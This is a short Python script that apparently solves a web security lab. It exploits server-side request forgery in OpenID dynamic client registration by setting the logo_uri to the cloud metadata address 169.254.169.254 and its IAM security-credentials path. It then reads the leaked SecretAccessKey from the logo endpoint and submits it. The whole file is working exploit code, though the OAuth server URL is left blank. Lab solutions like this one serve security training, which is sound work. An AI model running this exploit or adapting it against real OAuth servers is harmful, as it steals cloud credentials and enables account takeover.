import sys
import requests
from bs4 import BeautifulSoup
import json

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

# Get the ouath server URL from the authentication request
oauth_server_url = ''

# Register a new client application with the OpenID provider
# Include the uri we want to access as the logo_uri
header_data = {
    'Host': oauth_server_url
}
json_data = {
  "redirect_uris" : [
    "https://example.com"
  ],
  "logo_uri" : f"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
resp = s.post(f'http://{oauth_server_url}/reg', headers=header_data, json=json_data)

# Retrieve the client_id from the application we just made
# Use the client id to access the "logo" from the application we made
client_id = resp.json()['client_id']
logo_url = f'https://{oauth_server_url}/client/{client_id}/logo'
resp = s.get(logo_url)

# Retrieve the access key from the response
# Submit the key to the site to solve the lab
secret_key = resp.json()['SecretAccessKey']
solution_url = f'http://{site}/submitSolution'
resp = s.post(solution_url, data={'answer': secret_key})